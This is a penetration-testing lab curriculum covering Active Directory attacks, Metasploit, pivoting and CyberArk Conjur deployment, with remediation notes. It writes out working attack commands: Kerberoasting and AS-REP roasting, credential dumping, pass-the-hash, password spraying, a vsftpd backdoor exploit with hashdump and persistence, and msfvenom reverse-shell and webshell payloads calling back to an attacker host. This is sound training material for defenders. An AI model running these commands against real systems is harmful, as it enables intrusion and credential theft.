# Hands-On Labs: Phase 2 — Pentesting Foundations + Active Directory + Conjur

Step-by-step lab exercises for Months 7-12, covering network pentesting methodology, Active Directory attacks, Conjur deployment, and eJPT preparation.

---

## Prerequisites

- Phase 1 complete: PAM stack operational, Kali Linux configured
- DVWA and Burp Suite from Phase 1 already available
- RAM: 16GB minimum, 32GB recommended (AD lab adds 4 more VMs)
- Tool installs: Impacket, BloodHound CE, Neo4j, Chisel

**Lab Environment**: Builds on [HANDS_ON_LABS_PHASE1.md](HANDS_ON_LABS_PHASE1.md) infrastructure.

---

## Lab 1: Active Directory Lab Setup (Month 9)

Windows Server 2022 AD lab with 4 VMs on an isolated network:

| VM | Role | IP |
|----|------|----|
| DC01 | Domain Controller | 192.168.100.100 |
| SRV01 | Member Server | 192.168.100.101 |
| SRV02 | Member Server | 192.168.100.102 |
| WS01 | Workstation | 192.168.100.103 |

### Domain Controller Promotion

Run on DC01 after installing Windows Server 2022:

```powershell
# Install AD DS role
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to DC (creates lab.local domain)
Install-ADDSForest `
    -DomainName "lab.local" `
    -DomainNetbiosName "LAB" `
    -ForestMode "WinThreshold" `
    -DomainMode "WinThreshold" `
    -InstallDns `
    -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
    -Force
```

### Create Vulnerable AD Users for Attack Practice

```powershell
# Create OU structure
New-ADOrganizationalUnit -Name "LabUsers" -Path "DC=lab,DC=local"
New-ADOrganizationalUnit -Name "ServiceAccounts" -Path "DC=lab,DC=local"

# Create regular user
New-ADUser -Name "jsmith" -SamAccountName "jsmith" `
    -UserPrincipalName "jsmith@lab.local" -Path "OU=LabUsers,DC=lab,DC=local" `
    -AccountPassword (ConvertTo-SecureString "Password1" -AsPlainText -Force) `
    -Enabled $true

# Create Kerberoastable service account (has SPN)
New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" `
    -Path "OU=ServiceAccounts,DC=lab,DC=local" `
    -AccountPassword (ConvertTo-SecureString "SqlPassword123" -AsPlainText -Force) `
    -Enabled $true
Set-ADUser -Identity "svc_sql" -ServicePrincipalNames @{Add="MSSQLSvc/SRV01.lab.local:1433"}

# Create AS-REP Roastable user (no preauth required)
New-ADUser -Name "nopreauth" -SamAccountName "nopreauth" `
    -Path "OU=LabUsers,DC=lab,DC=local" `
    -AccountPassword (ConvertTo-SecureString "NoPre@uth123" -AsPlainText -Force) `
    -Enabled $true
Set-ADAccountControl -Identity "nopreauth" -DoesNotRequirePreAuth $true
```

---

## Lab 2: BloodHound CE Setup and AD Enumeration (Month 9)

### Install BloodHound CE

```bash
# Install BloodHound CE (Docker Compose method)
curl -L https://ghst.ly/getbhce | sudo bash
# Then start the stack:
docker compose up -d
# Access at http://localhost:8080
```

### Collect AD Data from Kali

```bash
# Install bloodhound-python collector (no agent needed)
pip3 install bloodhound

# Collect all AD data from Kali
bloodhound-python -d lab.local -u jsmith -p "Password1" \
    -ns 192.168.100.100 -c All --zip

# Upload the resulting .zip to the BloodHound CE UI
# Navigate to: Administration > File Ingest > Upload Files
```

### BloodHound Query Examples

Run and document findings for each query:

- Find all Domain Admins: `MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@LAB.LOCAL"}) RETURN u.name`
- Find Kerberoastable accounts: `MATCH (u:User {hasspn:true}) RETURN u.name`
- Find accounts with AdminTo edges: `MATCH p=(u:User)-[:AdminTo]->(c:Computer) RETURN p`
- Shortest path from owned account to DA: use the BloodHound UI Pathfinding feature after marking owned nodes

---

## Lab 3: Kerberoasting (Month 9)

```bash
# From Kali — Kerberoast svc_sql
impacket-GetUserSPNs lab.local/jsmith:Password1 \
    -dc-ip 192.168.100.100 \
    -request \
    -outputfile ~/lab/loot/kerberoast_hashes.txt

# View the hash
cat ~/lab/loot/kerberoast_hashes.txt

# Crack with Hashcat (Kerberos 5, etype 23, TGS-REP = mode 13100)
hashcat -m 13100 ~/lab/loot/kerberoast_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    --force

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt ~/lab/loot/kerberoast_hashes.txt
```

### Remediation Documentation

Document the full attack chain and CyberArk PAM remediation for your portfolio:

- Attack path: Kerberoastable service account -> offline hash cracking -> credential compromise
- CyberArk PAM remediation: vault `svc_sql` in PAM, enable CPM automatic rotation with a 180-character random password, making offline cracking computationally infeasible

---

## Lab 4: AS-REP Roasting (Month 9)

```bash
# AS-REP Roast the nopreauth account
impacket-GetNPUsers lab.local/ \
    -usersfile /tmp/users.txt \
    -dc-ip 192.168.100.100 \
    -format hashcat \
    -outputfile ~/lab/loot/asrep_hashes.txt

# Crack (Kerberos 5 AS-REP etype 23 = mode 18200)
hashcat -m 18200 ~/lab/loot/asrep_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    --force
```

### Remediation Documentation

- Attack path: Account with "Do not require Kerberos preauthentication" -> AS-REP captured without credentials -> offline cracking
- Remediation: Enable Kerberos pre-authentication on all accounts; vault any service accounts that legitimately require it in CyberArk PAM with automatic rotation

---

## Lab 5: Pass-the-Hash Lateral Movement (Months 9-10)

### Dump Credentials

```bash
# Dump local and domain hashes from a compromised Windows host
# Requires admin credentials or an existing shell on the target
impacket-secretsdump lab.local/jsmith:Password1@192.168.100.101
```

### Lateral Movement with Impacket

```bash
# Pass-the-Hash to access SRV02 as administrator
impacket-psexec lab.local/Administrator@192.168.100.102 \
    -hashes :aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>

impacket-wmiexec lab.local/Administrator@192.168.100.102 \
    -hashes :aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>

# Evil-WinRM (requires WinRM enabled on target)
evil-winrm -i 192.168.100.102 -u Administrator -H <NTLM_HASH>
```

---

## Lab 6: Network Enumeration and Password Attacks (Months 7-8, 10)

### SMB Enumeration

```bash
# Host discovery and share enumeration
crackmapexec smb 192.168.100.0/24
crackmapexec smb 192.168.100.0/24 --shares --no-bruteforce
enum4linux-ng -A 192.168.100.100
smbclient -L //192.168.100.100 -N
```

### LDAP Enumeration

```bash
# Anonymous LDAP query for naming contexts
ldapsearch -x -H ldap://192.168.100.100 -s base namingcontexts

# Authenticated LDAP user enumeration
ldapsearch -x -H ldap://192.168.100.100 -b "DC=lab,DC=local" \
    -D "jsmith@lab.local" -w "Password1" "(objectClass=user)" | grep sAMAccountName
```

### Password Spraying

```bash
# Low-and-slow spray: 1 attempt per account per 30 minutes to avoid lockout
crackmapexec smb 192.168.100.100 -u users.txt -p "Password1" --no-bruteforce
crackmapexec smb 192.168.100.100 -u users.txt -p "Company2026!" --no-bruteforce
```

### Hash Cracking

```bash
# NTLM hash cracking (mode 1000)
hashcat -m 1000 ~/lab/loot/ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# NetNTLMv2 cracking (mode 5600)
hashcat -m 5600 ~/lab/loot/netntlmv2.txt /usr/share/wordlists/rockyou.txt
```

---

## Lab 7: Metasploit Exploitation and Post-Exploitation (Month 8)

### Exploitation Against Metasploitable2

```bash
# Launch Metasploit
msfconsole
```

```bash
# Within msfconsole — vsftpd 2.3.4 backdoor
msf6> search vsftpd
msf6> use exploit/unix/ftp/vsftpd_234_backdoor
msf6> set RHOSTS 192.168.100.50
msf6> run

# Meterpreter post-exploitation commands
meterpreter> sysinfo
meterpreter> getuid
meterpreter> hashdump
meterpreter> run post/multi/recon/local_exploit_suggester
meterpreter> run post/windows/gather/credentials/credential_collector

# Persistence (lab environment only)
msf6> use post/windows/manage/persistence
```

### Msfvenom Payload Generation

```bash
# Windows reverse shell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.100.200 LPORT=4444 -f exe -o shell.exe

# Linux ELF payload
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=192.168.100.200 LPORT=4444 -f elf -o shell.elf

# PHP webshell
msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=192.168.100.200 LPORT=4444 -f raw -o shell.php
```

---

## Lab 8: Pivoting with Chisel and ProxyChains (Month 10)

### Chisel SOCKS Tunnel

```bash
# Attacker box: run Chisel server in reverse mode
./chisel server -p 8080 --reverse

# On pivot host (compromised machine): connect back to attacker
./chisel client 192.168.100.200:8080 R:socks

# Configure proxychains on Kali
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Route attacks through the tunnel
proxychains nmap -sT -Pn -p 22,80,443,445,3389 192.168.200.10
proxychains impacket-psexec lab.local/admin:password@192.168.200.10
proxychains crackmapexec smb 192.168.200.0/24
```

### SSH Dynamic Port Forwarding (Alternative)

```bash
# Create SOCKS proxy via SSH on pivot host
ssh -D 1080 -N -f user@pivot-host
# Then use proxychains as shown above
```

---

## Lab 9: Conjur OSS in Docker (Month 9)

### Deploy Conjur with Docker Compose

```bash
# Create lab directory
mkdir -p ~/conjur-lab && cd ~/conjur-lab
mkdir -p policy
```

```yaml
# docker-compose.yml
version: '3'
services:
  database:
    image: postgres:14
    environment:
      POSTGRES_HOST_AUTH_METHOD: trust
  conjur:
    image: cyberark/conjur
    command: server
    environment:
      DATABASE_URL: postgres://postgres@database/postgres
      CONJUR_DATA_KEY:
    depends_on:
      - database
    restart: on-failure
    ports:
      - 8090:80
  client:
    image: cyberark/conjur-cli:8
    entrypoint: sleep
    command: infinity
    volumes:
      - ./policy:/policy
```

```bash
# Generate data encryption key
docker compose run --no-deps --rm conjur data-key generate > data_key
export CONJUR_DATA_KEY=$(cat data_key)

# Start services
docker compose up -d database
docker compose up -d conjur

# Create admin account and save credentials
docker compose exec conjur conjurctl account create myConjurAccount > admin_credentials.txt
cat admin_credentials.txt
```

### Conjur Policy Authoring and Secret Storage

```bash
# Create root policy file
cat > policy/root.yml << 'EOF'
- !policy
  id: myapp
  body:
    - !variable db_password
    - !host myapp-host
    - !permit
      role: !host myapp-host
      privileges: [read, execute]
      resource: !variable db_password
EOF

# Load the policy
docker compose exec client conjur policy load -b root -f /policy/root.yml

# Set a secret value
docker compose exec client conjur variable set -i myapp/db_password -v "SuperSecret123!"

# Retrieve the secret to verify
docker compose exec client conjur variable get -i myapp/db_password
```

---

## Lab 10: Conjur on Kubernetes (Month 11)

### Create the Cluster and Install CyberArk Conjur

```bash
# Create K8s cluster with kind
kind create cluster --name conjur-lab

# Add CyberArk Helm repository
helm repo add cyberark https://cyberark.github.io/helm-charts
helm repo update

# Install Conjur OSS on K8s
helm install conjur cyberark/conjur-oss \
    --set dataKey=$(openssl rand -base64 32) \
    --set account.name=myConjurAccount \
    --namespace conjur \
    --create-namespace

# Wait for deployment to be ready
kubectl -n conjur rollout status deployment/conjur-conjur-oss

# Retrieve Conjur admin API key
ADMIN_API_KEY=$(kubectl -n conjur \
    exec $(kubectl -n conjur get pods -l "app=conjur-oss" -o name | head -1) \
    -- conjurctl role retrieve-key myConjurAccount:user:admin 2>/dev/null)
```

### Configure the Kubernetes Authenticator

```bash
# Create ConfigMap for Conjur connection settings
kubectl apply -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: conjur-connect
  namespace: default
data:
  CONJUR_ACCOUNT: "myConjurAccount"
  CONJUR_APPLIANCE_URL: "http://conjur-conjur-oss.conjur.svc.cluster.local"
  CONJUR_AUTHN_URL: "http://conjur-conjur-oss.conjur.svc.cluster.local/authn-k8s/k8s-cluster"
EOF
```

### Secrets Injection via Conjur Sidecar

```yaml
# Pod manifest: Conjur sidecar injects secrets into K8s Secrets, consumed by env var
apiVersion: v1
kind: Pod
metadata:
  name: myapp
  annotations:
    conjur.org/container-mode: "sidecar"
    conjur.org/secrets-destination: "k8s-secrets"
spec:
  serviceAccountName: conjur-authn
  containers:
    - name: myapp
      image: alpine
      command: ["sh", "-c", "while true; do echo $DB_PASSWORD; sleep 10; done"]
      env:
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: conjur-myapp-secrets
              key: db_password
```

---

## Lab 11: HackTheBox Machine Progression (Phase 2 Track)

**Months 8-12 — runs in parallel with all other labs**

These machines are selected specifically because they teach the techniques that appear on the OSCP exam and in real AD engagements. All are retired — full writeups exist if you need them, but attempt each machine without hints first. Document every machine the same way you will on the OSCP exam (see HANDS_ON_LABS_PHASE3.md for the note template).

**Rule**: Write a short report for every machine you complete. 1-2 pages: what you found, how you got in, how you escalated, what you would remediate. This builds the report-writing habit before OSCP demands it at 2am.

### Month 8: Windows Foundations (4 machines, ~10 hrs)

| Machine | OS | Difficulty | Key Technique | OSCP Relevance |
|---------|----|:----------:|---------------|----------------|
| Blue | Windows | Easy | EternalBlue (MS17-010) | Classic Windows SMB — enumerate → run exploit → SYSTEM |
| Legacy | Windows | Easy | MS08-067 | Older Windows service exploitation workflow |
| Jerry | Windows | Easy | Tomcat default creds → WAR shell | Web app foothold on Windows |
| Devel | Windows | Easy | FTP anonymous + ASPX webshell | File upload → foothold → local privesc |

### Month 9: Linux Foundations + First AD Machine (5 machines, ~14 hrs)

| Machine | OS | Difficulty | Key Technique | OSCP Relevance |
|---------|----|:----------:|---------------|----------------|
| Shocker | Linux | Easy | Shellshock (CGI script) | Web app → OS command injection |
| Bashed | Linux | Easy | Webshell discovery | Enumeration-first methodology |
| Nibbles | Linux | Easy | Web app → credential spray → sudo | Low-privilege enumeration + sudo escalation |
| Beep | Linux | Easy | Multi-service enumeration | Don't tunnel-vision — explore all services |
| Forest | Windows AD | Medium | AS-REP roasting → DCSync | **Critical** — full AD chain, directly maps to OSCP AD set |

Forest is the most important machine in Phase 2. It runs the exact attack chain you will face in the OSCP AD set: AS-REP roast a service account, get a hash, crack it, establish a foothold, enumerate with BloodHound, find a privilege escalation path (WriteDACL → DCSync), dump domain hashes. Do it twice.

### Month 10: AD Focus (4 machines, ~14 hrs)

| Machine | OS | Difficulty | Key Technique | OSCP Relevance |
|---------|----|:----------:|---------------|----------------|
| Active | Windows AD | Easy | Kerberoasting GPP password | Kerberoastable service account — core OSCP pattern |
| Resolute | Windows AD | Medium | DNS Admin → DLL injection | AD privesc via group membership abuse |
| Sauna | Windows AD | Easy | AS-REP roasting + WinPEAS privesc | Second full AD chain — different path than Forest |
| Optimum | Windows | Easy | HFS exploit + Windows privesc | Local exploit enumeration workflow |

### Month 11-12: Consolidation + Hard Machines (4 machines, ~16 hrs)

| Machine | OS | Difficulty | Key Technique | OSCP Relevance |
|---------|----|:----------:|---------------|----------------|
| Arctic | Windows | Easy | ColdFusion file upload | Web app on Windows — always check obscure services |
| Return | Windows AD | Easy | LDAP credential leak → privileged group | Credential hunting in services |
| Escape | Windows AD | Medium | MSSQL → Silver Ticket | Service account abuse beyond basic Kerberoasting |
| Cascade | Windows AD | Medium | LDAP + AD Recycle Bin | Deeper AD enumeration required |

**Phase 2 exit target**: 17 HackTheBox machines completed, all documented. By this point the AD attack chain should feel mechanical, not exploratory.

### HackTheBox Report Template (1-2 pages per machine)

```text
MACHINE: <name>   OS: <Windows/Linux>   Difficulty: <Easy/Medium>
Date: <YYYY-MM-DD>   Time to root: <hours>

FOOTHOLD
- Service: <what you found>
- Vulnerability: <CVE or technique name>
- How I found it: <enumeration step that revealed it>
- Commands:
  <paste key commands>

PRIVILEGE ESCALATION
- From: <user>  To: <user/SYSTEM/root>
- Method: <SUID/sudo/token impersonation/etc.>
- Commands:
  <paste key commands>

WHAT WOULD I REMEDIATE
- <one or two specific fixes an admin should apply>

WHAT I WOULD DO DIFFERENTLY
- <one honest lesson from this machine>
```

---

## Troubleshooting

### AD Lab — DC Unreachable from Kali

```bash
# Verify connectivity
ping -c 2 192.168.100.100 || nmap -sn 192.168.100.0/24
```

### Kerberoasting — "No SPNs Found"

```bash
# Confirm the SPN exists on svc_sql
impacket-GetUserSPNs lab.local/jsmith:Password1 -dc-ip 192.168.100.100
```

```powershell
# On DC01 — list all accounts with SPNs
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
```

### Conjur Docker — Port 8090 Not Responding

```bash
# Check container state and recent logs
docker compose ps
docker compose logs conjur | tail -20
```

### K8s Conjur Pod Crashloop

```bash
# Inspect events and logs for the failing pod
kubectl -n conjur describe pod <pod-name>
kubectl -n conjur logs <pod-name>
```

---

**Last Updated**: 2026-04-15
**Version**: 3.0
